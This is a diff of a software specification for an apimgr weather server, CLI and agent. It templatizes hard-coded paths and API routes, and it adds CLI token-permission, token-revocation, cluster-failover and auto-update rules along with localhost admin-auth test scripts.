         if [ -n \"\$SESSION\" ]; then
             echo '✓ Admin login successful'
@@ -40898,7 +42559,7 @@ incus exec "$CONTAINER_NAME" -- bash -c "
             # Generate API token for CLI/Agent testing
             API_TOKEN=\$(curl -q -LSsf -X POST \\
                 -H \"Authorization: Bearer \$SESSION\" \\
-                http://localhost:80/api/v1/admin/profile/token | grep -oP '\"token\":\\s*\"\\K[^\"]+' || echo '')
+                http://localhost:80/api/{api_version}/{admin_path}/profile/token | grep -oP '\"token\":\\s*\"\\K[^\"]+' || echo '')
 
             if [ -n \"\$API_TOKEN\" ]; then
                 echo \"✓ API token created: \${API_TOKEN:0:12}...\"
@@ -41084,7 +42745,7 @@ sleep 3
 # 1. Test that unauthenticated access is REJECTED
 echo "Testing unauthenticated access is blocked..."
 # Note: Use -q -LSs (no -f) when capturing HTTP status codes, since -f exits on 4xx/5xx
-HTTP_CODE=$(curl -q -LSs -o /dev/null -w "%{http_code}" http://localhost:64580/admin)
+HTTP_CODE=$(curl -q -LSs -o /dev/null -w "%{http_code}" http://localhost:64580/{admin_path})
 if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "401" ]; then
     echo "✓ Unauthenticated access properly rejected"
 else
@@ -41108,7 +42769,7 @@ echo "✓ Setup token found: ${SETUP_TOKEN:0:8}..."
 echo "Testing admin access with setup token..."
 HTTP_CODE=$(curl -q -LSs -o /dev/null -w "%{http_code}" \
     -H "X-Setup-Token: $SETUP_TOKEN" \
-    http://localhost:64580/admin)
+    http://localhost:64580/{admin_path})
 
 if [ "$HTTP_CODE" = "200" ]; then
     echo "✓ Admin access works with setup token"
@@ -41124,14 +42785,14 @@ curl -q -LSsf -X POST \
     -H "X-Setup-Token: $SETUP_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"username":"testadmin","password":"TestPass123!"}' \
-    http://localhost:64580/api/v1/admin/setup
+    http://localhost:64580/api/{api_version}/{admin_path}/setup
 
 # 5. Test login with created admin
 echo "Testing admin login..."
 SESSION=$(curl -q -LSsf -X POST \
     -H "Content-Type: application/json" \
     -d '{"username":"testadmin","password":"TestPass123!"}' \
-    http://localhost:64580/api/v1/admin/login | jq -r '.session_token')
+    http://localhost:64580/api/{api_version}/{admin_path}/login | jq -r '.session_token')
 
 if [ -z "$SESSION" ] || [ "$SESSION" = "null" ]; then
     echo "✗ FAILED: Admin login failed"
@@ -41144,7 +42805,7 @@ echo "✓ Admin login successful"
 # 6. Test admin routes with valid session
 echo "Testing admin routes with session..."
 curl -q -LSsf -H "Authorization: Bearer $SESSION" \
-    http://localhost:64580/api/v1/admin/users > /dev/null
+    http://localhost:64580/api/{api_version}/{admin_path}/users > /dev/null
 
 echo "✓ Admin routes work with authentication"
 
@@ -41155,7 +42816,7 @@ INVALID=$(curl -q -LSs -X POST \
     -H "Content-Type: application/json" \
     -d '{"username":"testadmin","password":"wrongpassword"}' \
     -w "%{http_code}" \
-    http://localhost:64580/api/v1/admin/login)
+    http://localhost:64580/api/{api_version}/{admin_path}/login)
 
 if echo "$INVALID" | grep -q "401\|403"; then
     echo "✓ Invalid credentials properly rejected"
@@ -41378,7 +43039,7 @@ incus launch images:debian/trixie test-weather
 
 # Push binary and test data
 incus file push binaries/weather test-weather/usr/local/bin/
-incus exec test-weather -- mkdir -p /etc/apimgr/weather /var/lib/apimgr/weather
+incus exec test-weather -- mkdir -p /etc/apimgr/{internal_name} /var/lib/apimgr/{internal_name}
 
 # Test
 incus exec test-weather -- weather --help
@@ -42026,7 +43687,7 @@ pymdown-extensions>=10.0
 
 ```bash
 # Docker
-docker run -p 64580:80 {PLATFORM_CONTAINER_REGISTRY}/apimgr/weather:latest
+docker run -p 64580:80 {PLATFORM_CONTAINER_REGISTRY}/apimgr/{internal_name}:latest
 
 # Binary
 ./weather-linux-amd64 --config server.yml
@@ -42050,8 +43711,8 @@ docker run -p 64580:80 {PLATFORM_CONTAINER_REGISTRY}/apimgr/weather:latest
 
 - [Repository](https://github.com/apimgr/weather)
 - [Live Demo](https://wthr.top) (if applicable)
-- [API Documentation](/openapi) (Swagger UI)
-- [GraphQL Playground](/graphql)
+- [API Documentation](/server/docs/swagger) (Swagger UI)
+- [GraphQL Playground](/server/docs/graphql)
 
 ## License
 
@@ -42070,7 +43731,7 @@ docker run -d \
   --name weather \
   -p 64580:80 \
   -v weather-data:/data \
-  {PLATFORM_CONTAINER_REGISTRY}/apimgr/weather:latest
+  {PLATFORM_CONTAINER_REGISTRY}/apimgr/{internal_name}:latest
 ```
 
 ## Binary
@@ -42079,7 +43740,7 @@ Download from [releases](https://github.com/apimgr/weather/releases):
 
 ```bash
 # Linux AMD64
-wget {PLATFORM_RELEASE_URL}/weather-linux-amd64
+wget --no-config -nv -O weather-linux-amd64 {PLATFORM_RELEASE_URL}/weather-linux-amd64
 chmod +x weather-linux-amd64
 ./weather-linux-amd64
 ```
@@ -42141,22 +43802,26 @@ All settings are configurable via the WebUI at `/admin`.
 
 ## REST API
 
-Base URL: `/api/v1/`
+Base URL: `/api/{api_version}/`
 
 ### Endpoints
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/healthz` | GET | Health check |
-| `/api/v1/{resource}` | GET | List resources |
+| `/api/{api_version}/healthz` | GET | Health check |
+| `/api/{api_version}/{resource}` | GET | List resources |
 
 ## Swagger UI
 
-Interactive API documentation: [/openapi](/openapi)
+Interactive API documentation: [/server/docs/swagger](/server/docs/swagger)
+
+OpenAPI spec: `/api/openapi.json` (current version) or `/api/{api_version}/openapi.json` (specific version).
 
 ## GraphQL
 
-GraphQL playground: [/graphql](/graphql)
+GraphQL playground: [/server/docs/graphql](/server/docs/graphql)
+
+GraphQL endpoint: `/api/graphql` (current version) or `/api/{api_version}/graphql` (specific version).
 
 ### Schema
 
@@ -42187,7 +43852,7 @@ GraphQL playground: [/graphql](/graphql)
 
 ## Admin API
 
-Programmatic access via `/api/v1/admin/` with bearer token authentication.
+Programmatic access via `/api/{api_version}/{admin_path}/` with bearer token authentication.
 ```
 
 ### docs/development.md
@@ -42484,7 +44149,7 @@ var localeFS embed.FS
     "requires_restart": "Requiere reinicio",
     "page_x_of_y": "Página {current} de {total}",
     "showing_x_of_y": "Mostrando {count} de {total}",
-    "last_updated": "Última actualización: {datetime}",
+    "last_updated": "Última actualización: {date_time}",
     "made_with": "Hecho con"
   },
 
@@ -43266,7 +44931,7 @@ var localeFS embed.FS
       "what_you_should_do": "QUÉ DEBE HACER",
       "contact_information": "INFORMACIÓN DE CONTACTO",
       "sent_to": "Este correo fue enviado a: {recipient_email}",
-      "from": "De: {app_name} (wthr.top)",
+      "from": "De: {app_name} ({fqdn})",
       "ignore_if_not_requested": "Si no solicitó esto, ignore este mensaje.",
       "no_action_required": "No se requiere ninguna acción de su parte.",
       "password_not_changed": "Su contraseña no será cambiada a menos que haga clic en el enlace anterior.",
@@ -43406,7 +45071,7 @@ var localeFS embed.FS
   },
 
   "cli": {
-    "description": "weather 1.0.0 - {project_description}",
+    "description": "weather {project_version} - {project_description}",
     "usage": "Uso:",
     "information": "Información:",
     "shell_integration": "Integración de shell:",
@@ -43425,7 +45090,7 @@ var localeFS embed.FS
     "daemon_started": "Demonio iniciado con PID {pid}",
     "already_running": "Ya en ejecución (pid {pid})",
     "running_in_mode": "Ejecutando en modo: {app_mode}",
-    "http_address": "HTTP: {proto}://wthr.top:{port}",
+    "http_address": "HTTP: {proto}://{fqdn}:{port}",
     "listening_on": "Escuchando en {proto}://{address}:{port}",
     "server_started_on": "Servidor iniciado en {startup_datetime}",
     "server_started_ok": "Servidor iniciado exitosamente",
@@ -43448,7 +45113,7 @@ var localeFS embed.FS
   },
 
   "agent": {
-    "description": "weather-agent 1.0.0 - Agente para weather",
+    "description": "weather-agent {project_version} - Agente para weather",
     "usage": "Uso:",
     "commands": "Comandos:",
     "flags": "Opciones:",
@@ -43471,7 +45136,7 @@ var localeFS embed.FS
     "self_update": "Verificar/realizar actualización",
     "banner_mode": "Modo: {mode}",
     "banner_server": "Servidor: {url}",
-    "banner_hostname": "Nombre de host: {hostname}",
+    "banner_hostname": "Nombre de host: {host_name}",
     "banner_tags": "Etiquetas: {tags}",
     "banner_connected": "Conectado al servidor",
     "banner_disconnected": "Desconectado del servidor",
@@ -43490,7 +45155,7 @@ var localeFS embed.FS
   },
 
   "version": {
-    "name_version": "weather 1.0.0",
+    "name_version": "weather {project_version}",
     "built": "Compilado: {build_date}",
     "go": "Go: {go_version}",
     "os_arch": "SO/Arq: {goos}/{goarch}"
@@ -43665,10 +45330,9 @@ func handleError(w http.ResponseWriter, r *http.Request, code string) {
 // GET /api/v1/items/999?lang=es
 // Response:
 {
-  "error": {
-    "code": "NOT_FOUND",
-    "message": "No encontrado"
-  }
+  "ok": false,
+  "error": "NOT_FOUND",
+  "message": "No encontrado"
 }
 ```
 
@@ -45367,11 +47031,11 @@ No impact on binary size - Tor is external. Application binary remains small and
 
 | Environment | {config_dir} | {data_dir} | {log_dir} |
 |-------------|--------------|------------|-----------|
-| Docker | `/config/weather/` | `/data/weather/` | `/data/log/weather/` |
-| Linux root | `/etc/apimgr/weather/` | `/var/lib/apimgr/weather/` | `/var/log/apimgr/weather/` |
-| Linux user | `~/.config/apimgr/weather/` | `~/.local/share/apimgr/weather/` | `~/.local/log/apimgr/weather/` |
-| macOS | `~/Library/Application Support/apimgr/weather/` | Same as config | `~/Library/Logs/apimgr/weather/` |
-| Windows | `%AppData%\apimgr\weather\` | Same as config | `%AppData%\apimgr\weather\log\` |
+| Docker | `/config/{internal_name}/` | `/data/{internal_name}/` | `/data/log/{internal_name}/` |
+| Linux root | `/etc/apimgr/{internal_name}/` | `/var/lib/apimgr/{internal_name}/` | `/var/log/apimgr/{internal_name}/` |
+| Linux user | `~/.config/apimgr/{internal_name}/` | `~/.local/share/apimgr/{internal_name}/` | `~/.local/log/apimgr/{internal_name}/` |
+| macOS | `~/Library/Application Support/apimgr/{internal_name}/` | Same as config | `~/Library/Logs/apimgr/{internal_name}/` |
+| Windows | `%AppData%\apimgr\{internal_name}\` | Same as config | `%AppData%\apimgr\{internal_name}\log\` |
 
 **Tor directories are ALWAYS `{config_dir}/tor/`, `{data_dir}/tor/`, `{log_dir}/tor.log` - never hardcoded paths.**
 
@@ -45537,7 +47201,7 @@ func ensureTorFile(path string, content []byte) error {
 
 ## Admin Panel
 
-### /admin/server/tor (WebUI)
+### /{admin_path}/server/tor (WebUI)
 
 **Hidden service is ALWAYS enabled if Tor binary is found.** No enable/disable toggle.
 
@@ -45829,20 +47493,20 @@ make
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/tor` | GET | Get Tor status, config, and .onion address |
-| `/api/v1/admin/server/tor` | PATCH | Update Tor settings (validates before saving) |
-| `/api/v1/admin/server/tor/validate` | POST | Validate config without saving |
-| `/api/v1/admin/server/tor/regenerate` | POST | Regenerate .onion address |
-| `/api/v1/admin/server/tor/restart` | POST | Restart Tor process |
-| `/api/v1/admin/server/tor/vanity` | GET | Get vanity generation status |
-| `/api/v1/admin/server/tor/vanity` | POST | Start vanity generation |
-| `/api/v1/admin/server/tor/vanity` | DELETE | Cancel vanity generation |
-| `/api/v1/admin/server/tor/vanity/apply` | POST | Apply vanity address |
-| `/api/v1/admin/server/tor/import` | POST | Import external keys |
+| `/api/{api_version}/{admin_path}/server/tor` | GET | Get Tor status, config, and .onion address |
+| `/api/{api_version}/{admin_path}/server/tor` | PATCH | Update Tor settings (validates before saving) |
+| `/api/{api_version}/{admin_path}/server/tor/validate` | POST | Validate config without saving |
+| `/api/{api_version}/{admin_path}/server/tor/regenerate` | POST | Regenerate .onion address |
+| `/api/{api_version}/{admin_path}/server/tor/restart` | POST | Restart Tor process |
+| `/api/{api_version}/{admin_path}/server/tor/vanity` | GET | Get vanity generation status |
+| `/api/{api_version}/{admin_path}/server/tor/vanity` | POST | Start vanity generation |
+| `/api/{api_version}/{admin_path}/server/tor/vanity` | DELETE | Cancel vanity generation |
+| `/api/{api_version}/{admin_path}/server/tor/vanity/apply` | POST | Apply vanity address |
+| `/api/{api_version}/{admin_path}/server/tor/import` | POST | Import external keys |
 
 ### Response Format
 
-**GET `/api/v1/admin/server/tor`**
+**GET `/api/{api_version}/{admin_path}/server/tor`**
 
 ```json
 {
@@ -45871,7 +47535,7 @@ make
 }
 ```
 
-**POST `/api/v1/admin/server/tor/validate`** (or PATCH with invalid config)
+**POST `/api/{api_version}/{admin_path}/server/tor/validate`** (or PATCH with invalid config)
 
 ```json
 {
@@ -45889,7 +47553,7 @@ make
 }
 ```
 
-**PATCH `/api/v1/admin/server/tor`** (success)
+**PATCH `/api/{api_version}/{admin_path}/server/tor`** (success)
 
 ```json
 {
@@ -45990,8 +47654,8 @@ When a project includes a client, it provides a terminal-based interface for int
 | Default binary name | `weather-cli` |
 | Versioning | Same as main application |
 | Build | Part of same Makefile (`make build` produces both binaries) |
-| Config location (Unix) | `~/.config/apimgr/weather/cli.yml` |
-| Config location (Windows) | `%APPDATA%\apimgr\weather\cli.yml` |
+| Config location (Unix) | `~/.config/apimgr/{internal_name}/cli.yml` |
+| Config location (Windows) | `%APPDATA%\apimgr\{internal_name}\cli.yml` |
 
 ## Binary Naming Rules 
 
@@ -46003,7 +47667,7 @@ When a project includes a client, it provides a terminal-based interface for int
 | `--help` output | Shows actual binary name | - |
 | `--version` output | Shows actual binary name | - |
 | User-Agent | - | `weather-cli/{version}` (hardcoded) |
-| Config paths | - | `/etc/apimgr/weather/` (hardcoded) |
+| Config paths | - | `/etc/apimgr/{internal_name}/` (hardcoded) |
 
 ```go
 // Display: use actual binary name
@@ -46028,7 +47692,7 @@ userAgent := fmt.Sprintf("%s-cli/%s", projectName, version)
 2. `--token-file` flag (file path)
 3. Environment variable: `WEATHER_TOKEN`
 4. Config file: `cli.yml` → `token: xxx`
-5. Token file: `{config_dir}/token` (Unix: `~/.config/apimgr/weather/token`, Windows: `%APPDATA%\apimgr\weather\token`)
+5. Token file: `{config_dir}/token` (Unix: `~/.config/apimgr/{internal_name}/token`, Windows: `%APPDATA%\apimgr\{internal_name}\token`)
 
 **Token format:** See PART 11 "API Token Security" for token format and validation.
 
@@ -46072,6 +47736,89 @@ weather-cli list
 weather-cli login
 # Saves to {config_dir}/token (see platform-specific paths above)
 ```
+
+## CLI Config File Permissions
+
+**`cli.yml` and the standalone `token` file both contain a bearer credential. They MUST be created with restrictive permissions and the binary MUST refuse to load them if the perms are too loose:**
+
+| Path | Required perms | Behavior on mismatch |
+|------|----------------|----------------------|
+| `~/.config/apimgr/{internal_name}/cli.yml` (Unix) | `0600` (`-rw-------`) | If world or group readable → log a warning to stderr and refuse to use the token; user must `chmod 0600` and retry |
+| `~/.config/apimgr/{internal_name}/token` (Unix) | `0600` | Same |
+| `%APPDATA%\apimgr\{internal_name}\cli.yml` (Windows) | ACL: only the running user (no `Everyone`, no `Users`) | Same warning + refusal |
+| `%APPDATA%\apimgr\{internal_name}\token` (Windows) | Same | Same |
+
+**The CLI's `login` command writes new files with the correct perms via `os.WriteFile(..., 0600)` then `os.Chmod(..., 0600)` (defense in depth — Windows ignores the mode bit, ACL inheritance handles it). The check on read uses `os.Stat()` and bails if `info.Mode().Perm() & 0o077 != 0`.**
+
+## CLI Token Revocation Handling
+
+**When a user's API token is revoked server-side (admin clicked "Revoke" on the user's token, or the user logged out from another session), running CLI processes get `401 TOKEN_REVOKED` on their next request. The CLI's response MUST be graceful, not a crash:**
+
+| Scenario | CLI behavior |
+|----------|--------------|
+| Interactive (TUI) session | Show a modal: "Your session has been revoked. Please log in again." Block until user picks "Re-login" (drops to inline `weather-cli login` prompt) or "Quit". Don't kill in-flight UI state — preserve any unsaved drafts in `{config_dir}/draft/`. |
+| Non-interactive (single-shot command, scripted use) | Print to stderr: `error: your API token has been revoked. Run 'weather-cli login' to re-authenticate.` Exit with a non-zero code (PART 8 has an exit-code table for `--status` only — for general CLI use, simply exit non-zero so shell pipelines see the failure). |
+| Background watch / streaming (e.g., `weather-cli watch`) | Stop the stream, print the same stderr message, exit with code `4`. Do NOT auto-retry — re-auth must be a deliberate user action to prevent prompt-loops on credentials. |
+
+**On `401 TOKEN_REVOKED`:** the CLI MUST also delete the cached token from `cli.yml` / `token` so the next invocation prompts for fresh credentials instead of replaying the dead token. Same behavior on `401 TOKEN_EXPIRED`.
+
+**No 3-channel propagation like agents:** CLI is short-lived and request-driven, so the simple "next request returns 401, CLI exits gracefully" pattern is sufficient. There's no long-poll/WebSocket channel to push a control message.
+
+## CLI Cluster Failover
+
+**The autodiscover response (PART 14) returns the full cluster URL list (`primary` + `cluster: [...]`). The CLI MUST honor this for fault tolerance — if the primary becomes unreachable mid-session, the CLI tries the next cluster URL automatically.**
+
+| Step | Action |
+|------|--------|
+| 1. Initial config | After `login` (or initial bootstrap), CLI calls `/api/autodiscover` and caches the full cluster URL list in `cli.yml` under `server.cluster: [...]`. |
+| 2. Periodic refresh | Every 30 minutes (or on every CLI start, whichever comes first), CLI re-runs autodiscover against `server.primary` and refreshes the cluster list. |
+| 3. Failover | On any request to `server.primary` that fails with a connection-level error (DNS failure, TCP timeout, TLS handshake failure, 5xx after retry) — NOT auth or 4xx errors — the CLI tries each `server.cluster` URL in order with a fresh request. First success becomes the new "preferred" URL for the rest of the session. |
+| 4. Promotion | If the primary stays down for >5 minutes (CLI session-local timer) AND a cluster URL is consistently working, CLI updates `cli.yml` to make the working URL the new `server.primary`. The old primary stays in `cluster:` so it's tried again later. |
+| 5. Total failure | If ALL cluster URLs fail, print: `error: cannot reach weather server at any of {N} configured URLs (last error: ...)`. Exit non-zero. Do not auto-retry beyond the cluster list — operator handles via DNS / connectivity tools. |
+
+The CLI never adds URLs that weren't in the autodiscover response — operators control which cluster nodes are exposed.
+
+## CLI Auto-Update (Same Pattern as Server Self-Update + Agent)
+
+**The CLI follows the same flow as the server's self-update (PART 23) and the agent's auto-update (PART 33 above): check version via autodiscover, download from the server, verify SHA-256, atomic replace, restart.**
+
+| Step | Action |
+|------|--------|
+| 1. Discover | CLI's `/api/autodiscover` response includes `cli_versions: { "linux-amd64": {"version": "1.2.3", "sha256": "..."}, ... }` and `cli_min_version`. CLI checks on every start (it's short-lived; no separate poll loop needed) and additionally on `weather-cli --update check`. |
+| 2. Decide | If `current_version < cli_versions[os-arch].version`: prompt the user (interactive) OR auto-update silently (when `update.auto: true` AND non-interactive AND `--update yes` was passed earlier). If `current_version < cli_min_version`: refuse to make further requests until updated; print "this CLI is too old; the server requires {min_version} — run 'weather-cli --update yes' to upgrade." |
+| 3. Download | Fetch `{base}/cli/binaries/weather-cli-{os}-{arch}` over HTTPS (with bearer token if logged in; without if `--update` is run pre-login). Save to a tmp path (`/tmp/apimgr/weather-XXXXXX/cli.update.tmp` per the spec's tmp-dir rules). |
+| 4. Verify SHA-256 | Same `verifyChecksum()` from PART 23 — match against the `sha256` from autodiscover. Mismatch → delete temp, abort with stderr error. |
+| 5. Atomic swap | Same platform-specific `replaceBinary()` from PART 23. The CLI is user-installed (typically `/usr/local/bin/` or `~/bin/`) — if the user lacks write permission to the install path, CLI prints "you do not have permission to update {binary_path}; ask your admin or move the binary to a writable path" and exits cleanly. |
+| 6. Re-exec | After successful replace, CLI `exec`s the new binary with the original argv to continue the in-progress command. (Server / agent restart via service manager; CLI just re-execs since it's foreground.) |
+
+**Configuration (`cli.yml`):**
+
+```yaml
+update:
+  auto: false                # default false for CLI (interactive prompt unless explicitly opted in). Server / agent default true.
+  check_interval: per_invocation   # CLI is short-lived; checks once per command. No background poll.
+  channel: stable
+```
+
+**Server-side endpoints:**
+
+| Endpoint | Method | Auth | Purpose |
+|----------|--------|------|---------|
+| `/api/autodiscover` | GET | None or bearer | Returns `cli_versions` (each entry has `version` + `sha256`) and `cli_min_version` alongside agent and server info |
+| `{base}/cli/binaries/weather-cli-{os}-{arch}` | GET | None (public — CLIs are user-distributed) OR bearer if `cli.binary_download.require_auth: true` is set | Streams the binary |
+
+**Why CLI download default is unauthenticated:** the CLI is the entry point for new users. Forcing auth on the download means they need a token before they can install the tool that obtains the token. Operators who run a private deployment can flip `cli.binary_download.require_auth` to `true`.
+
+**Audit events (added to PART 11 taxonomy):**
+
+| Event | Description |
+|-------|-------------|
+| `cli.update_started` | CLI began an auto-update download |
+| `cli.update_completed` | CLI restarted on new version |
+| `cli.update_checksum_invalid` | SHA-256 didn't match the published checksum |
+| `cli.update_forced` | CLI below `cli_min_version`; refused to make further requests until updated |
+| `cli.token_revoked_detected` | CLI received `401 TOKEN_REVOKED`, exited / cleared cached token |
+| `cli.cluster_failover` | CLI failed over from primary to cluster URL |
 
 ## User/Org Context (Smart Detection, NON-NEGOTIABLE)
 
@@ -46174,17 +47921,17 @@ func ValidateAccess(ctx context.Context, token *Token, target string, action str
 
 ```bash
 # Default: use token owner's personal context (no --user flag)
-weather-cli list                    # GET /api/v1/users/{resource} (current user)
+weather-cli list                    # GET /api/{api_version}/users/{resource} (current user)
 
 # Explicit user context (view another user's public resources)
-weather-cli --user @alice list      # GET /api/v1/users/alice/{resource}
+weather-cli --user @alice list      # GET /api/{api_version}/users/alice/{resource}
 
 # Org context (user must have org access)
-weather-cli --user +acme-corp list  # GET /api/v1/orgs/acme-corp/{resource}
+weather-cli --user +acme-corp list  # GET /api/{api_version}/orgs/acme-corp/{resource}
 
 # Auto-detect: CLI determines if name is user or org
-weather-cli --user alice list       # GET /api/v1/users/alice/{resource} (if user)
-weather-cli --user acme-corp list   # GET /api/v1/orgs/acme-corp/{resource} (if org)
+weather-cli --user alice list       # GET /api/{api_version}/users/alice/{resource} (if user)
+weather-cli --user acme-corp list   # GET /api/{api_version}/orgs/acme-corp/{resource} (if org)
 ```
 
 **Note:** `{resource}` is the project-specific resource type (e.g., `repos`, `pastes`, `links`). See IDEA.md for your project's resources.
@@ -46195,17 +47942,17 @@ weather-cli --user acme-corp list   # GET /api/v1/orgs/acme-corp/{resource} (if 
 
 | CLI Command | API Route |
 |-------------|-----------|
-| `list` (no flag) | `GET /api/v1/users/{resource}` (current user) |
-| `--user @alice list` | `GET /api/v1/users/alice/{resource}` |
-| `--user +acme-corp list` | `GET /api/v1/orgs/acme-corp/{resource}` |
-| `--user alice list` | Auto-detect → `/api/v1/users/alice/{resource}` or `/api/v1/orgs/alice/{resource}` |
+| `list` (no flag) | `GET /api/{api_version}/users/{resource}` (current user) |
+| `--user @alice list` | `GET /api/{api_version}/users/alice/{resource}` |
+| `--user +acme-corp list` | `GET /api/{api_version}/orgs/acme-corp/{resource}` |
+| `--user alice list` | Auto-detect → `/api/{api_version}/users/alice/{resource}` or `/api/{api_version}/orgs/alice/{resource}` |
 
 ```bash
 # CLI translates --user to URL-scoped route
 weather-cli --user acme-corp list
 
 # Becomes:
-GET /api/v1/orgs/acme-corp/{resource}
+GET /api/{api_version}/orgs/acme-corp/{resource}
 Authorization: Bearer usr_abc123...
 ```
 
@@ -46215,15 +47962,15 @@ Authorization: Bearer usr_abc123...
 CLI receives --user flag
 │
 ├─► No --user flag
-│   └─► Use /api/v1/users/{resource} (current user from token)
+│   └─► Use /api/{api_version}/users/{resource} (current user from token)
 │
 ├─► --user NAME provided
-│   ├─► Prefix @? → Use /api/v1/users/{name}/{resource}
-│   ├─► Prefix +? → Use /api/v1/orgs/{name}/{resource}
+│   ├─► Prefix @? → Use /api/{api_version}/users/{name}/{resource}
+│   ├─► Prefix +? → Use /api/{api_version}/orgs/{name}/{resource}
 │   └─► No prefix → CLI auto-detects:
 │       ├─► Query server for name type
-│       ├─► User? → /api/v1/users/{name}/{resource}
-│       ├─► Org? → /api/v1/orgs/{name}/{resource}
+│       ├─► User? → /api/{api_version}/users/{name}/{resource}
+│       ├─► Org? → /api/{api_version}/orgs/{name}/{resource}
 │       └─► Neither → Error: not found
 │
 └─► Server validates token has access to resource
@@ -46531,7 +48278,7 @@ if env.IsAutoDetectDisplayModeGUI() {
 
 | Binary | First Run | Configuration Method |
 |--------|-----------|---------------------|
-| **Server** | Start with defaults, show status banner | WebUI at `/admin` |
+| **Server** | Start with defaults, show status banner | WebUI at `/{admin_path}` |
 | **CLI** | Setup wizard (GUI/TUI) | Setup wizard (no WebUI for CLI) |
 | **Agent** | Start with connection string, show status banner | Server provides connection string |
 
@@ -46548,11 +48295,11 @@ if env.IsAutoDetectDisplayModeGUI() {
 | **Headless/daemon** | Log to file |
 
 **No built-in TUI/GUI wizard for Server or Agent binaries.** They just run:
-- **Server**: Has web-based setup at `/admin/server/setup` (accessed via browser, see PART 17)
+- **Server**: Has web-based setup at `/{admin_path}/server/setup` (accessed via browser, see PART 17)
 - **Agent**: Configured via connection string from server admin panel
 
 **Note:** "Setup wizard" has two meanings:
-1. **Server's web-based setup** - HTML pages served by server, accessed in browser at `/admin/server/setup`
+1. **Server's web-based setup** - HTML pages served by server, accessed in browser at `/{admin_path}/server/setup`
 2. **CLI's built-in TUI/GUI wizard** - interactive wizard built into CLI binary itself
 
 Only CLI has a built-in wizard. Server serves web pages for setup.
@@ -47628,23 +49375,23 @@ The client uses the same user directory structure as the server in user mode. Th
 
 | Directory | Path | Purpose |
 |-----------|------|---------|
-| Config | `~/.config/apimgr/weather/` | Configuration files |
-| Config File | `~/.config/apimgr/weather/cli.yml` | CLI configuration |
-| Data | `~/.local/share/apimgr/weather/` | Persistent data |
-| Cache | `~/.cache/apimgr/weather/` | Temporary/cached data |
-| Logs | `~/.local/log/apimgr/weather/` | Log files |
-| Log File | `~/.local/log/apimgr/weather/cli.log` | CLI log output |
+| Config | `~/.config/apimgr/{internal_name}/` | Configuration files |
+| Config File | `~/.config/apimgr/{internal_name}/cli.yml` | CLI configuration |
+| Data | `~/.local/share/apimgr/{internal_name}/` | Persistent data |
+| Cache | `~/.cache/apimgr/{internal_name}/` | Temporary/cached data |
+| Logs | `~/.local/log/apimgr/{internal_name}/` | Log files |
+| Log File | `~/.local/log/apimgr/{internal_name}/cli.log` | CLI log output |
 
 #### Windows
 
 | Directory | Path | Purpose |
 |-----------|------|---------|
-| Config | `%APPDATA%\apimgr\weather\` | Configuration files |
-| Config File | `%APPDATA%\apimgr\weather\cli.yml` | CLI configuration |
-| Data | `%LOCALAPPDATA%\apimgr\weather\data\` | Persistent data |
-| Cache | `%LOCALAPPDATA%\apimgr\weather\cache\` | Temporary/cached data |
-| Logs | `%LOCALAPPDATA%\apimgr\weather\log\` | Log files |
-| Log File | `%LOCALAPPDATA%\apimgr\weather\log\cli.log` | CLI log output |
+| Config | `%APPDATA%\apimgr\{internal_name}\` | Configuration files |
+| Config File | `%APPDATA%\apimgr\{internal_name}\cli.yml` | CLI configuration |
+| Data | `%LOCALAPPDATA%\apimgr\{internal_name}\data\` | Persistent data |
+| Cache | `%LOCALAPPDATA%\apimgr\{internal_name}\cache\` | Temporary/cached data |
+| Logs | `%LOCALAPPDATA%\apimgr\{internal_name}\log\` | Log files |
+| Log File | `%LOCALAPPDATA%\apimgr\{internal_name}\log\cli.log` | CLI log output |
 
 #### Directory Usage
 
@@ -47656,9 +49403,9 @@ The client uses the same user directory structure as the server in user mode. Th
 | Logs | `cli.log`, debug logs | Optional |
 
 **NEVER use OS system directories:**
-- `/etc/apimgr/weather/` (Linux system config)
-- `/var/lib/apimgr/weather/` (Linux system data)
-- `/var/log/apimgr/weather/` (Linux system logs)
+- `/etc/apimgr/{internal_name}/` (Linux system config)
+- `/var/lib/apimgr/{internal_name}/` (Linux system data)
+- `/var/log/apimgr/{internal_name}/` (Linux system logs)
 - `C:\ProgramData\` (Windows system data)
 - Any directory requiring elevated privileges
 
@@ -47670,10 +49417,10 @@ On every startup, the CLI MUST:
 
 1. **Ensure directories exist** (create if missing):
    ```
-   ├─ {config_dir}/           (~/.config/apimgr/weather/)
-   ├─ {data_dir}/             (~/.local/share/apimgr/weather/)
-   ├─ {cache_dir}/            (~/.cache/apimgr/weather/)
-   └─ {log_dir}/              (~/.local/log/apimgr/weather/)
+   ├─ {config_dir}/           (~/.config/apimgr/{internal_name}/)
+   ├─ {data_dir}/             (~/.local/share/apimgr/{internal_name}/)
+   ├─ {cache_dir}/            (~/.cache/apimgr/{internal_name}/)
+   └─ {log_dir}/              (~/.local/log/apimgr/{internal_name}/)
    ```
 
 2. **Set correct permissions** (user-only access):
@@ -47924,7 +49671,7 @@ weather-cli --config ~/work/prod.yml list  # Uses absolute path
 **EVERYTHING must be configurable via cli.yml. Sane defaults match server where applicable.**
 
 ```yaml
-# ~/.config/apimgr/weather/cli.yml
+# ~/.config/apimgr/{internal_name}/cli.yml
 # client configuration - ALL options with defaults
 
 # Server connection
@@ -48021,7 +49768,7 @@ On every CLI command:
 2. Try server.primary
 3. If fails → try server.cluster nodes (silent failover)
 4. Execute command on first available node
-5. Background: GET /api/v1/healthz
+5. Background: GET /api/{api_version}/healthz
 6. Read cluster.primary and cluster.nodes from response
 7. Update server.primary and server.cluster in cli.yml (async, non-blocking)
 ```
@@ -48086,7 +49833,7 @@ To configure a server, run:
   weather-cli --server https://your-server.example.com list
 
 This will save the server address for future commands.
-Or edit ~/.config/apimgr/weather/cli.yml directly.
+Or edit ~/.config/apimgr/{internal_name}/cli.yml directly.
 ```
 
 **Projects with official site show default in help:**
@@ -48106,7 +49853,7 @@ Flags:
 - CLI/Agent: Default `--server` URL (so users don't need to specify)
 
 **What official site does NOT affect:**
-- Docker labels (use `apimgr`, `weather`, `wthr.top`)
+- Docker labels (use `apimgr`, `weather`, `{fqdn}`)
 - Documentation structure or content
 - Build artifacts or binary metadata
 - Any runtime behavior (just a compiled default)
@@ -48411,7 +50158,7 @@ func printInit(shell, binaryName string) {
 
 ```bash
 $ weather-cli --help
-weather-cli 1.0.0 - CLI for weather
